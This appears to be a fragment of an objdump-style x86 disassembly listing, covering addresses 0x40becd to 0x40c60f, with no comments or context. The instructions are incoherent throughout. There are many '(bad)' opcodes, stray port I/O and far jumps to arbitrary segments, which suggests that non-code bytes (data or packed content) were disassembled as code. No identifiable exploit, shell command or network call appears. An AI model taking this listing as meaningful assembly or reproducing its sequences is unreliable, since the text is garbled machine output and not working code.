  40becd:	seta   BYTE PTR [eax+0x7bcfea8a]
  40bed4:	xor    eax,0x7b7070fa
  40bed9:	mov    ebx,0xb892c085
  40bede:	jb     0x40bf41
  40bee0:	mov    ebx,0x98aadd34
  40bee5:	pop    ss
  40bee6:	out    dx,al
  40bee7:	mov    ebx,0x5d5bc8a
  40beec:	adc    eax,DWORD PTR [edi-0x2d]
  40beef:	dec    esp
  40bef0:	or     ah,ah
  40bef2:	sbb    BYTE PTR [esi+0x59],ch
  40bef5:	fdivr  DWORD PTR [esi]
  40bef7:	mov    eax,DWORD PTR [eax-0x60]
  40befa:	pop    ebp
  40befb:	ins    DWORD PTR es:[edi],dx
  40befc:	(bad)  
  40befd:	xlat   BYTE PTR ds:[ebx]
  40befe:	xlat   BYTE PTR ds:[ebx]
  40beff:	retf   0x6307
  40bf02:	cmp    dl,BYTE PTR [ecx-0x319e7dfb]
  40bf08:	xor    eax,0x5a43a199
  40bf0d:	fs das 
  40bf0f:	daa    
  40bf10:	xor    esp,ecx
  40bf12:	push   ss
  40bf13:	jbe    0x40becb
  40bf15:	adc    eax,0x61f16439
  40bf1a:	inc    eax
  40bf1b:	dec    ecx
  40bf1c:	je     0x40bedd
  40bf1e:	xchg   ebx,eax
  40bf1f:	jo     0x40bf4a
  40bf21:	in     eax,dx
  40bf22:	xor    eax,0x8bf84811
  40bf27:	ss inc eax
  40bf29:	mov    ch,BYTE PTR [eax+0x188b8652]
  40bf2f:	cmp    ebp,esp
  40bf31:	lock (bad) 
  40bf33:	and    esp,DWORD PTR [ebx]
  40bf35:	mov    edi,0x33212aea
  40bf3a:	ins    DWORD PTR es:[edi],dx
  40bf3b:	mov    ebp,0x5f71f1e7
  40bf40:	shl    DWORD PTR [edi],1
  40bf42:	test   eax,0x425a2f02
  40bf47:	daa    
  40bf48:	push   ecx
  40bf49:	lods   eax,DWORD PTR ds:[esi]
  40bf4a:	lods   eax,DWORD PTR ds:[esi]
  40bf4b:	xchg   ebp,eax
  40bf4c:	sbb    eax,0x188bfad4
  40bf51:	outs   dx,DWORD PTR ds:[esi]
  40bf52:	call   0xb98d:0xa995b88b
  40bf59:	enter  0x42a3,0x17
  40bf5d:	fistp  DWORD PTR [esi]
  40bf5f:	jmp    0x70cfe32f
  40bf64:	sub    eax,0xd4278f81
  40bf69:	jmp    0xd2fbb2c5
  40bf6e:	(bad)  
  40bf6f:	xlat   BYTE PTR ds:[ebx]
  40bf70:	dec    edx
  40bf71:	cmp    BYTE PTR [edi],bh
  40bf73:	scas   al,BYTE PTR es:[edi]
  40bf74:	mov    esi,0xa158ebdd
  40bf79:	push   ebx
  40bf7a:	dec    esi
  40bf7b:	repnz fld DWORD PTR [eax+0x7c]
  40bf7f:	lock je 0x40bf20
  40bf82:	push   ebp
  40bf83:	mov    bh,0xc9
  40bf85:	aam    0x3a
  40bf87:	rcr    ah,cl
  40bf89:	je     0x40bfd3
  40bf8b:	mov    esp,DWORD PTR [ecx+0x53a88d0e]
  40bf91:	ja     0x40bf93
  40bf93:	popa   
  40bf94:	dec    DWORD PTR [eax]
  40bf96:	lahf   
  40bf97:	gs dec ecx
  40bf99:	mov    eax,0xc3534b85
  40bf9e:	repz xchg edx,eax
  40bfa0:	or     ebx,DWORD PTR ds:0x5283e6cc
  40bfa6:	(bad)  
  40bfa7:	push   ds
  40bfa8:	mov    edx,DWORD PTR [ebp-0x30]
  40bfab:	adc    BYTE PTR [ebp+0x21fcbdb5],0x73
  40bfb2:	fadd   st(5),st
  40bfb4:	mov    eax,DWORD PTR [esi+0x50]
  40bfb7:	adc    ebp,DWORD PTR [ecx-0x67a652b]
  40bfbd:	sbb    ch,BYTE PTR [ebp+0x2c]
  40bfc0:	unpckhps xmm3,XMMWORD PTR [ecx+0x7b]
  40bfc4:	push   ebx
  40bfc5:	jbe    0x40bf4e
  40bfc7:	es mov ss,ebx
  40bfca:	mov    esi,0x14180302
  40bfcf:	jne    0x40bf93
  40bfd1:	ss clc 
  40bfd3:	xor    esp,edi
  40bfd5:	mov    al,0x90
  40bfd7:	inc    esp
  40bfd8:	mov    BYTE PTR [ecx],dl
  40bfda:	lock sbb eax,DWORD PTR [ecx]
  40bfdd:	inc    edi
  40bfde:	std    
  40bfdf:	pxor   mm6,QWORD PTR [edi+0x5f8e7528]
  40bfe6:	mov    al,ds:0xa79048eb
  40bfeb:	dec    ebp
  40bfec:	sbb    edi,DWORD PTR [ebx+0x56e904c1]
  40bff2:	(bad)  
  40bff3:	pop    eax
  40bff4:	jecxz  0x40c050
  40bff6:	jecxz  0x40c00c
  40bff8:	in     eax,dx
  40bff9:	push   ss
  40bffa:	jnp    0x40c048
  40bffc:	hlt    
  40bffd:	add    dl,al
  40bfff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c000:	lods   eax,DWORD PTR ds:[esi]
  40c001:	js     0x40bfb3
  40c003:	push   ecx
  40c004:	mov    ebx,0x98a3b699
  40c009:	test   al,0x1e
  40c00b:	mov    edx,DWORD PTR [edx+0x1056c433]
  40c011:	sub    eax,0xff48a90
  40c016:	retf   0xa0a4
  40c019:	fwait
  40c01a:	sar    bh,0x85
  40c01d:	nop
  40c01e:	sub    BYTE PTR [eax-0x16d9d432],ch
  40c024:	in     al,0xaa
  40c026:	arpl   WORD PTR [esi+0x139e35c0],di
  40c02c:	xchg   edi,eax
  40c02d:	call   0x33d79adf
  40c032:	mov    BYTE PTR [ebp-0x6c3aa370],bl
  40c038:	test   DWORD PTR [edx],esp
  40c03a:	inc    ebp
  40c03b:	jmp    0x1252f798
  40c040:	adc    cl,BYTE PTR [edx-0x65f10ba1]
  40c046:	push   esp
  40c047:	push   ss
  40c048:	xor    bh,BYTE PTR [edi]
  40c04a:	and    ecx,ebx
  40c04c:	js     0x40c005
  40c04e:	jo     0x40c010
  40c050:	outs   dx,DWORD PTR ds:[esi]
  40c051:	push   0x24
  40c053:	mov    ecx,0xb4aef359
  40c058:	dec    ebx
  40c059:	call   0xce7e:0xccd6515b
  40c060:	mov    ds:0xe59888ca,eax
  40c065:	fs xchg ah,dh
  40c068:	in     eax,dx
  40c069:	sbb    eax,0xd30c2f8c
  40c06e:	(bad)  
  40c06f:	scas   eax,DWORD PTR es:[edi]
  40c070:	add    ah,BYTE PTR [ecx]
  40c072:	ret    0x2a4c
  40c075:	inc    eax
  40c076:	inc    ebx
  40c077:	stos   DWORD PTR es:[edi],eax
  40c078:	retf   0xe940
  40c07b:	sbb    DWORD PTR [edx+0x5506d47b],ebx
  40c081:	sbb    BYTE PTR ss:[esp+eax*1],bl
  40c085:	out    dx,al
  40c086:	jmp    0xe7baf558
  40c08b:	ds xchg edi,eax
  40c08d:	jg     0x40c088
  40c08f:	push   esp
  40c090:	add    eax,0xf8626863
  40c095:	xor    eax,0x9de0e5fd
  40c09a:	xor    DWORD PTR [esi+ecx*2+0x1f],ebx
  40c09e:	adc    BYTE PTR [ebp-0x28],dh
  40c0a1:	mov    ah,0xed
  40c0a3:	cmp    esi,DWORD PTR [ebx+0x34]
  40c0a6:	(bad)  
  40c0a7:	jmp    0x2f81:0x102604fe
  40c0ae:	push   cs
  40c0af:	add    DWORD PTR [eax-0x77871695],edi
  40c0b5:	sbb    sp,ax
  40c0b8:	out    0xc8,al
  40c0ba:	in     al,0x9f
  40c0bc:	xchg   ebp,eax
  40c0bd:	xchg   edx,eax
  40c0be:	imul   DWORD PTR [ecx-0x34]
  40c0c1:	xor    esi,0xfebd0ef7
  40c0c7:	sbb    al,0xec
  40c0c9:	jb     0x40c130
  40c0cb:	rcr    BYTE PTR [esi+0x3a],cl
  40c0ce:	push   es
  40c0cf:	out    dx,eax
  40c0d0:	and    DWORD PTR [ecx],edi
  40c0d2:	(bad)  
  40c0d5:	sub    BYTE PTR [ecx],bl
  40c0d7:	ds dec esi
  40c0d9:	add    DWORD PTR [ebp-0x41],edx
  40c0dc:	test   al,0xb9
  40c0de:	into   
  40c0df:	shl    esi,0x82
  40c0e2:	mov    ecx,0xe2bdf43b
  40c0e7:	or     esi,ebx
  40c0e9:	imul   esi,DWORD PTR [esp+eiz*8],0xffffff93
  40c0ed:	push   esp
  40c0ee:	jmp    0x40c104
  40c0f0:	fimul  WORD PTR [ecx-0x13]
  40c0f3:	adc    DWORD PTR [edi+eiz*4+0x7],esp
  40c0f7:	jge    0x40c08f
  40c0f9:	dec    ecx
  40c0fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c0fb:	xor    BYTE PTR [ecx],ch
  40c0fd:	ja     0x40c0b3
  40c0ff:	retf   
  40c100:	inc    eax
  40c101:	fnstsw WORD PTR fs:[edi]
  40c104:	inc    ecx
  40c105:	pushf  
  40c106:	add    eax,0xc80e376b
  40c10b:	push   cs
  40c10c:	das    
  40c10d:	imul   ecx,DWORD PTR [esi],0x76
  40c110:	lds    esp,FWORD PTR [ecx]
  40c112:	je     0x40c0b0
  40c114:	or     eax,0x5c30807b
  40c119:	loop   0x40c111
  40c11b:	rol    DWORD PTR ds:0xaebc71a9,cl
  40c121:	and    ebx,DWORD PTR [ebx+0x13574dbb]
  40c127:	pop    ebx
  40c128:	ror    BYTE PTR [ecx-0x12],cl
  40c12b:	and    al,0x90
  40c12d:	or     eax,0x281900e1
  40c132:	pop    ebx
  40c133:	jno    0x40c0e7
  40c135:	and    eax,0xe176b2f5
  40c13a:	dec    eax
  40c13b:	mov    dh,0xd8
  40c13d:	mov    esp,0x3fcd6ac8
  40c142:	mov    esi,0x6edabe75
  40c147:	cmp    al,0x58
  40c149:	add    al,0xf8
  40c14b:	fisubr WORD PTR [edx-0x47]
  40c14e:	in     al,dx
  40c14f:	cld    
  40c150:	lods   eax,DWORD PTR ds:[esi]
  40c151:	jmp    0xafa7:0x72e80266
  40c158:	xchg   esp,eax
  40c159:	cld    
  40c15a:	or     DWORD PTR [ecx-0x16],0x7c6f25d2
  40c161:	leave  
  40c162:	popf   
  40c163:	xor    DWORD PTR [ebx-0x356e6dd5],ebp
  40c169:	xor    bh,BYTE PTR ds:0x6c524c17
  40c16f:	stc    
  40c170:	stos   DWORD PTR es:[edi],eax
  40c171:	int3   
  40c172:	mov    ecx,0xb4659980
  40c177:	pushf  
  40c178:	inc    ecx
  40c179:	sub    al,bl
  40c17b:	sbb    eax,0x3752a668
  40c180:	enter  0x8c02,0xea
  40c184:	(bad)  
  40c185:	xor    eax,esp
  40c187:	xchg   edx,eax
  40c188:	call   DWORD PTR [eax+0x374b4645]
  40c18e:	mov    edx,0x851e901a
  40c193:	mov    edi,0x64ccb00f
  40c198:	(bad)  
  40c199:	sbb    eax,0xa8582954
  40c19e:	push   ss
  40c19f:	xor    eax,DWORD PTR [esi]
  40c1a1:	mov    eax,ds:0x83c7289d
  40c1a6:	loope  0x40c1fe
  40c1a8:	xchg   ebx,eax
  40c1a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c1aa:	dec    edx
  40c1ab:	movsx  ebp,dh
  40c1ae:	cwde   
  40c1af:	pop    edx
  40c1b0:	(bad)  
  40c1b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c1b3:	sub    edi,eax
  40c1b5:	jnp    0x40c1b7
  40c1b7:	xor    eax,0xbd27b9d
  40c1bc:	inc    ecx
  40c1bd:	cmp    eax,0x4fe4d00d
  40c1c2:	adc    edx,DWORD PTR ds:0xc8a08303
  40c1c8:	mov    edi,0xcad924fb
  40c1cd:	adc    esi,DWORD PTR [eax+edx*1+0x1fa702c6]
  40c1d4:	adc    al,0x5
  40c1d6:	jne    0x40c1d6
  40c1d8:	mov    DWORD PTR [edx+0x2fc2553f],eax
  40c1de:	(bad)  
  40c1df:	(bad)  
  40c1e0:	cmc    
  40c1e1:	outs   dx,BYTE PTR ds:[esi]
  40c1e2:	sti    
  40c1e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c1e4:	sub    bh,BYTE PTR [esi+0x67]
  40c1e7:	or     bl,dh
  40c1e9:	jae    0x40c24a
  40c1eb:	dec    ebp
  40c1ec:	jg     0x40c1f5
  40c1ee:	cmp    al,0x11
  40c1f0:	or     BYTE PTR [edi+0x1fcfa323],bh
  40c1f6:	(bad)  
  40c1f7:	popa   
  40c1f8:	and    DWORD PTR [ecx-0x5b1b597e],edx
  40c1fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c1ff:	jecxz  0x40c1f8
  40c201:	jbe    0x40c1f8
  40c203:	loopne 0x40c18c
  40c205:	mov    ch,0x6e
  40c207:	sbb    DWORD PTR [ebp-0xbf6d7a3],esp
  40c20d:	in     eax,dx
  40c20e:	mov    ?,WORD PTR [ebp+0x6f]
  40c211:	inc    esp
  40c212:	xchg   ecx,eax
  40c213:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c214:	shr    cl,0xe5
  40c217:	test   al,0xb5
  40c219:	add    eax,0xb56112ae
  40c21e:	aad    0x78
  40c220:	lea    edx,[edi+0xe]
  40c223:	iret   
  40c224:	mov    ah,0x8
  40c226:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c227:	ja     0x40c1fa
  40c229:	sar    DWORD PTR [eax],cl
  40c22b:	mov    edi,DWORD PTR [esi+0xd]
  40c22e:	push   ds
  40c22f:	mov    al,0x59
  40c231:	and    esi,DWORD PTR [esi]
  40c233:	jecxz  0x40c256
  40c235:	and    al,0x15
  40c237:	add    bh,0xf5
  40c23a:	cmc    
  40c23b:	jbe    0x40c200
  40c23d:	hlt    
  40c23e:	sub    ch,cl
  40c240:	les    eax,FWORD PTR [ebx+ebp*1]
  40c243:	aad    0xd6
  40c245:	sub    BYTE PTR ds:0xf4b91d75,al
  40c24b:	inc    ebx
  40c24c:	xor    bh,BYTE PTR [ebp-0xc]
  40c24f:	lahf   
  40c250:	add    esp,DWORD PTR [ecx]
  40c252:	dec    ebp
  40c253:	mov    cl,0xb
  40c255:	cmc    
  40c256:	and    bl,bh
  40c258:	mov    dl,0x29
  40c25a:	pushf  
  40c25b:	add    DWORD PTR ds:0x5fa60a96,0xffffff87
  40c262:	call   0xfae00257
  40c267:	ret    
  40c268:	push   edi
  40c269:	and    DWORD PTR [edx],ecx
  40c26b:	xor    BYTE PTR [esi-0x5a],al
  40c26e:	je     0x40c2cb
  40c270:	ins    BYTE PTR es:[edi],dx
  40c271:	cs pop edx
  40c273:	xor    ah,BYTE PTR [esi-0x76]
  40c276:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c277:	jmp    0x192972ce
  40c27c:	(bad)  
  40c27d:	sbb    eax,0x1048178c
  40c282:	pop    eax
  40c283:	(bad)  
  40c284:	in     al,dx
  40c285:	aam    0x97
  40c287:	mov    WORD PTR [esi],es
  40c289:	retf   0x6b97
  40c28c:	cld    
  40c28d:	dec    ebx
  40c28e:	test   eax,0xd1550a6d
  40c293:	mov    ebx,edi
  40c295:	xor    eax,DWORD PTR [ebx]
  40c297:	cdq    
  40c298:	pop    ebp
  40c299:	mov    eax,0xe9806caf
  40c29e:	push   esp
  40c29f:	ffree  st(5)
  40c2a1:	jns    0x40c273
  40c2a3:	cmp    al,0x7
  40c2a5:	inc    edx
  40c2a6:	enter  0x45d6,0x60
  40c2aa:	mov    eax,ds:0x417e47a8
  40c2af:	mov    DWORD PTR [ebx+edi*1+0x72],edx
  40c2b3:	and    DWORD PTR [ecx],esp
  40c2b5:	pop    es
  40c2b6:	fnsave [edi+esi*2-0x35]
  40c2ba:	cmp    eax,0x609945e2
  40c2bf:	push   esp
  40c2c0:	push   ebp
  40c2c1:	out    0x81,al
  40c2c3:	push   esp
  40c2c4:	or     BYTE PTR [edx+0x6ce62015],ah
  40c2ca:	dec    esi
  40c2cb:	imul   esp,DWORD PTR [esi+0x71],0xffffff84
  40c2cf:	pop    ebx
  40c2d0:	jns    0x40c316
  40c2d2:	into   
  40c2d3:	push   esi
  40c2d4:	adc    dl,bh
  40c2d6:	fsub   DWORD PTR [eax]
  40c2d8:	popf   
  40c2d9:	jl     0x40c263
  40c2db:	cwde   
  40c2dc:	inc    esp
  40c2dd:	or     al,0xed
  40c2df:	push   ecx
  40c2e0:	xchg   ebp,eax
  40c2e1:	pop    ebx
  40c2e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c2e3:	das    
  40c2e4:	sti    
  40c2e5:	(bad)  
  40c2e6:	jge    0x40c2c1
  40c2e8:	leave  
  40c2e9:	adc    bl,BYTE PTR [edi-0x39]
  40c2ec:	push   esi
  40c2ed:	push   ebx
  40c2ee:	and    eax,0x315947d2
  40c2f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c2f4:	in     eax,0xbf
  40c2f6:	cdq    
  40c2f7:	hlt    
  40c2f8:	adc    esi,eax
  40c2fa:	jmp    0xaa51820d
  40c2ff:	push   eax
  40c300:	das    
  40c301:	pop    ebp
  40c302:	out    0xec,al
  40c304:	fs push cs
  40c306:	sar    BYTE PTR [ebx+0x47],0x89
  40c30a:	ror    DWORD PTR [edi-0x39],0x6
  40c30e:	xor    DWORD PTR [edi],0xffffffe4
  40c311:	into   
  40c312:	je     0x40c2ad
  40c314:	inc    eax
  40c315:	test   al,0x37
  40c317:	call   0x23ab:0x5b243dc4
  40c31e:	jo     0x40c367
  40c320:	cdq    
  40c321:	sub    al,0x27
  40c323:	in     al,0x69
  40c325:	cmp    DWORD PTR [esp+edi*8+0x20],esi
  40c329:	mov    eax,0x6fdab687
  40c32e:	dec    edx
  40c32f:	in     eax,dx
  40c330:	rol    DWORD PTR [edx+0x4d],1
  40c333:	mov    esi,0xb410ef51
  40c338:	sub    BYTE PTR [esi-0x442cb415],dh
  40c33e:	dec    edi
  40c33f:	mov    BYTE PTR [bx+si-0x3302],0xb6
  40c345:	ja     0x40c2e1
  40c347:	test   eax,0x7e42c120
  40c34c:	add    BYTE PTR ds:0x41a5c1bd,dl
  40c352:	sub    BYTE PTR [eax],bl
  40c354:	jp     0x40c3a6
  40c356:	in     eax,dx
  40c357:	cld    
  40c358:	add    al,0xdd
  40c35a:	ffreep st(5)
  40c35c:	cmc    
  40c35d:	xlat   BYTE PTR ds:[ebx]
  40c35e:	dec    ebx
  40c35f:	stc    
  40c360:	xchg   BYTE PTR [esi+0x72],dh
  40c363:	xlat   BYTE PTR ds:[ebx]
  40c364:	in     eax,dx
  40c365:	push   ecx
  40c366:	cmp    eax,DWORD PTR [ecx]
  40c368:	jge    0x40c3b0
  40c36a:	popf   
  40c36b:	mov    eax,0xf1ee9275
  40c370:	dec    esi
  40c371:	xchg   DWORD PTR [ecx-0x41],ebx
  40c374:	push   edx
  40c375:	call   0xdfe138b4
  40c37a:	dec    esp
  40c37b:	push   0x39
  40c37d:	jg     0x40c319
  40c37f:	mov    es,WORD PTR [edi-0x18942cf1]
  40c385:	mov    al,0xfa
  40c387:	sti    
  40c388:	aam    0x4
  40c38a:	hlt    
  40c38b:	(bad)  
  40c38c:	jno    0x40c332
  40c38e:	lahf   
  40c38f:	mov    esi,0xc94de90
  40c394:	in     al,dx
  40c395:	xor    al,0xe2
  40c397:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c398:	scas   eax,DWORD PTR es:[edi]
  40c399:	inc    ecx
  40c39a:	jmp    0x40c350
  40c39c:	in     al,dx
  40c39d:	mov    eax,ds:0x690dd361
  40c3a2:	repz es adc eax,0x1d1977b4
  40c3a9:	and    edi,DWORD PTR [ecx+eax*1-0x165f337e]
  40c3b0:	shr    DWORD PTR [ecx-0x13a626e6],cl
  40c3b6:	push   0x57771609
  40c3bb:	mov    edx,0x2b73861a
  40c3c0:	or     BYTE PTR [esi],0x71
  40c3c3:	sub    eax,0x6148b198
  40c3c8:	test   BYTE PTR [edx+0x36cd6576],0xe4
  40c3cf:	mov    al,0x2f
  40c3d1:	(bad)  
  40c3d2:	test   DWORD PTR [eax+edi*1+0x1629db],ebp
  40c3d9:	or     eax,0x4617420
  40c3de:	dec    esi
  40c3df:	inc    edi
  40c3e0:	jl     0x40c39a
  40c3e2:	cwde   
  40c3e3:	test   al,0x3f
  40c3e5:	fsubr  DWORD PTR [eax+ecx*1+0x788c793f]
  40c3ec:	pop    ss
  40c3ed:	stc    
  40c3ee:	retf   
  40c3ef:	lahf   
  40c3f0:	dec    esp
  40c3f1:	sub    esi,DWORD PTR [esi-0xae455ca]
  40c3f7:	or     al,0x97
  40c3f9:	mov    ch,0x58
  40c3fb:	add    ebx,DWORD PTR [ebp+0x67de6adb]
  40c401:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c402:	das    
  40c403:	push   eax
  40c404:	or     ch,BYTE PTR [edx+esi*8]
  40c407:	lods   al,BYTE PTR ds:[esi]
  40c408:	(bad)  
  40c409:	out    dx,al
  40c40a:	imul   esi,DWORD PTR [edi],0xff64da82
  40c410:	xor    edi,DWORD PTR [ebx-0x80]
  40c413:	dec    ebp
  40c414:	mov    esi,0x2905d3e5
  40c419:	sub    BYTE PTR [esp+ebp*4-0x2669cb7a],ah
  40c420:	mov    cl,0x1f
  40c422:	mov    bh,0x19
  40c424:	fwait
  40c425:	xchg   edx,eax
  40c426:	sbb    al,0xeb
  40c428:	cmp    eax,0xeca3ff59
  40c42d:	mov    ah,0x3c
  40c42f:	aaa    
  40c430:	rol    bl,1
  40c432:	pusha  
  40c433:	ins    BYTE PTR es:[edi],dx
  40c434:	imul   BYTE PTR [ebp-0x2bdb7da]
  40c43a:	push   eax
  40c43b:	xor    DWORD PTR [esp+ebp*8],ebx
  40c43e:	scas   al,BYTE PTR es:[edi]
  40c43f:	dec    esi
  40c440:	test   DWORD PTR [edx+edi*1],edx
  40c443:	inc    esi
  40c444:	dec    esi
  40c445:	adc    BYTE PTR [edi+0x67],dl
  40c448:	das    
  40c449:	cmp    dh,BYTE PTR [esi]
  40c44b:	push   edi
  40c44c:	push   esi
  40c44d:	scas   eax,DWORD PTR es:[edi]
  40c44e:	xchg   edx,eax
  40c44f:	in     eax,0xfd
  40c451:	jecxz  0x40c401
  40c453:	outs   dx,DWORD PTR ds:[esi]
  40c454:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c455:	jecxz  0x40c420
  40c457:	test   DWORD PTR [esi-0x5e],0x65b8bf7c
  40c45e:	ret    
  40c45f:	out    0x3c,al
  40c461:	test   BYTE PTR [eax-0x6b],bh
  40c464:	push   esi
  40c465:	imul   esi,DWORD PTR [ecx+esi*4+0x6d75b55a],0x6e9a4f51
  40c470:	rcr    BYTE PTR gs:[ecx-0x7],0xaa
  40c475:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c476:	dec    ecx
  40c477:	cs jns 0x40c461
  40c47a:	sbb    al,0x23
  40c47c:	je     0x40c4c9
  40c47e:	pop    ebp
  40c47f:	das    
  40c480:	mov    bh,0x7b
  40c482:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c483:	fbld   TBYTE PTR [ebx-0x42798cf6]
  40c489:	call   0x6fa046b9
  40c48e:	stc    
  40c48f:	(bad)  
  40c490:	cld    
  40c491:	sub    al,0x50
  40c493:	fnstcw WORD PTR [esi]
  40c495:	xor    bl,BYTE PTR [eax-0x3c]
  40c498:	or     BYTE PTR [edx+0x7ad1a39e],ah
  40c49e:	shr    BYTE PTR [ebp+0x2a],cl
  40c4a1:	mov    BYTE PTR [esi],bl
  40c4a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c4a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c4a5:	mov    cl,0xa2
  40c4a7:	adc    ebp,DWORD PTR [ebx+edi*8-0x5d]
  40c4ab:	mov    bh,0x8f
  40c4ad:	(bad)  
  40c4ae:	aam    0xd7
  40c4b0:	dec    eax
  40c4b1:	inc    ecx
  40c4b2:	jb     0x40c4d5
  40c4b4:	jp     0x40c532
  40c4b6:	mov    bh,0x6f
  40c4b8:	lods   al,BYTE PTR ds:[esi]
  40c4b9:	out    0x35,al
  40c4bb:	cmp    DWORD PTR [eax+ebp*4-0x5b],edi
  40c4bf:	cs sti 
  40c4c1:	bound  eax,QWORD PTR [eax+edx*2]
  40c4c4:	mov    dl,0x2e
  40c4c6:	inc    esi
  40c4c7:	push   esp
  40c4c8:	out    dx,eax
  40c4c9:	mov    al,ds:0x9cfd8f5b
  40c4ce:	xor    eax,0x73cc3b51
  40c4d3:	or     ebp,DWORD PTR [eax+0x3f]
  40c4d6:	sbb    dl,BYTE PTR [esi]
  40c4d8:	nop
  40c4d9:	mov    BYTE PTR [edx],0x88
  40c4dc:	neg    DWORD PTR [ecx+0x22]
  40c4df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c4e0:	pop    es
  40c4e1:	inc    eax
  40c4e2:	aaa    
  40c4e3:	sub    DWORD PTR [edi+0x1b],esi
  40c4e6:	mov    eax,ds:0x24b2abe4
  40c4eb:	push   ebx
  40c4ec:	fwait
  40c4ed:	push   ds
  40c4ee:	dec    al
  40c4f0:	aas    
  40c4f1:	retf   0xc1cc
  40c4f4:	mov    bl,0x8e
  40c4f6:	jbe    0x40c548
  40c4f8:	dec    ebp
  40c4f9:	repnz cdq 
  40c4fb:	daa    
  40c4fc:	loope  0x40c523
  40c4fe:	cmp    cl,bh
  40c500:	inc    edi
  40c501:	xchg   edx,eax
  40c502:	out    0x21,al
  40c504:	fcomp  QWORD PTR [ebx]
  40c506:	int3   
  40c507:	cmp    al,0xb2
  40c509:	arpl   WORD PTR [esi+0x7a],cx
  40c50c:	xchg   edx,eax
  40c50d:	mov    esi,0x2ad701fd
  40c512:	push   ebp
  40c513:	loop   0x40c4fc
  40c515:	pop    esp
  40c516:	push   0x61
  40c518:	add    DWORD PTR ds:0x8e6a2be7,ebp
  40c51e:	fcomp  QWORD PTR [ebp-0x391eb032]
  40c524:	int3   
  40c525:	sar    BYTE PTR [ecx+0x724893d9],0xda
  40c52c:	xor    cl,BYTE PTR [edx]
  40c52e:	sbb    al,BYTE PTR [eax]
  40c530:	jo     0x40c561
  40c532:	lds    ecx,FWORD PTR fs:[eax-0x34]
  40c536:	xchg   esp,eax
  40c537:	xor    al,0xc5
  40c539:	push   cs
  40c53a:	sub    edx,esi
  40c53c:	in     eax,dx
  40c53d:	push   edx
  40c53e:	jecxz  0x40c592
  40c540:	test   cl,ah
  40c542:	or     esi,ebx
  40c544:	fisubr WORD PTR [ebp+0x13]
  40c547:	dec    esi
  40c548:	cmp    BYTE PTR [esi-0x44b20c8b],ah
  40c54e:	in     eax,dx
  40c54f:	mov    ds,WORD PTR [edx]
  40c551:	push   edi
  40c552:	test   al,0x15
  40c554:	in     eax,dx
  40c555:	push   edi
  40c556:	sub    DWORD PTR [ebx],ebp
  40c558:	fsubr  QWORD PTR [ecx+ebp*2-0x15fa2916]
  40c55f:	and    eax,0xdb58008f
  40c564:	aas    
  40c565:	scas   eax,DWORD PTR es:[edi]
  40c566:	add    edi,DWORD PTR [ebx+0x14]
  40c569:	ficom  DWORD PTR [edi+0x157e5025]
  40c56f:	push   cs
  40c570:	pop    es
  40c571:	push   cs
  40c572:	jp     0x40c591
  40c574:	sbb    al,dh
  40c576:	loop   0x40c5cf
  40c578:	ins    DWORD PTR es:[edi],dx
  40c579:	ins    BYTE PTR es:[edi],dx
  40c57a:	mul    ch
  40c57c:	jno    0x40c54d
  40c57e:	push   cs
  40c57f:	mov    ds:0xf7f729ec,eax
  40c584:	adc    DWORD PTR [ebx+0x6e53cc03],edx
  40c58a:	lds    ecx,FWORD PTR [ecx-0x1e]
  40c58d:	jge    0x40c5f9
  40c58f:	mov    edi,0xf7210581
  40c594:	mov    cl,0xc
  40c596:	jne    0x40c591
  40c598:	dec    esp
  40c599:	mov    al,0xc4
  40c59b:	xchg   BYTE PTR [ecx-0x7d],dl
  40c59e:	out    0xd0,eax
  40c5a0:	ror    DWORD PTR [edx],1
  40c5a2:	or     cl,BYTE PTR [edi-0x43]
  40c5a5:	dec    esp
  40c5a6:	in     eax,dx
  40c5a7:	jb     0x40c5b9
  40c5a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c5aa:	(bad)  
  40c5ab:	cmp    eax,0xce4c9a5d
  40c5b0:	push   esp
  40c5b1:	jbe    0x40c5f1
  40c5b3:	cmp    esp,edx
  40c5b5:	cdq    
  40c5b6:	inc    edi
  40c5b7:	mov    ecx,DWORD PTR [edx-0x43dbd1ff]
  40c5bd:	push   eax
  40c5be:	xchg   edi,eax
  40c5bf:	dec    edi
  40c5c0:	inc    esi
  40c5c1:	hlt    
  40c5c2:	xor    dh,BYTE PTR [eax+0x15e0bef2]
  40c5c8:	test   edx,0x369b3f5e
  40c5ce:	js     0x40c564
  40c5d0:	outs   dx,BYTE PTR ds:[esi]
  40c5d1:	adc    BYTE PTR [edi],0xb2
  40c5d4:	mov    ds:0x94919f81,eax
  40c5d9:	rol    BYTE PTR [esi-0xbaef588],0xf7
  40c5e0:	lock cwde 
  40c5e2:	les    edi,FWORD PTR [esi+0x7ba5c33b]
  40c5e8:	out    dx,al
  40c5e9:	stos   BYTE PTR es:[edi],al
  40c5ea:	fisttp DWORD PTR [ebx]
  40c5ec:	sar    DWORD PTR [eax-0x48fa4311],1
  40c5f2:	hlt    
  40c5f3:	mov    ss:0xfe513485,al
  40c5f9:	xchg   ecx,eax
  40c5fa:	fadd   DWORD PTR [ecx]
  40c5fc:	repz in eax,dx
  40c5fe:	(bad)
  40c601:	inc    edx
  40c602:	pushf  
  40c603:	sbb    ebx,DWORD PTR [esi]
  40c605:	jo     0x40c5d8
  40c607:	push   esi
  40c608:	sbb    BYTE PTR [ebx+0x77d8981e],bl
  40c60e:	leave  
  40c60f:	in     eax,dx
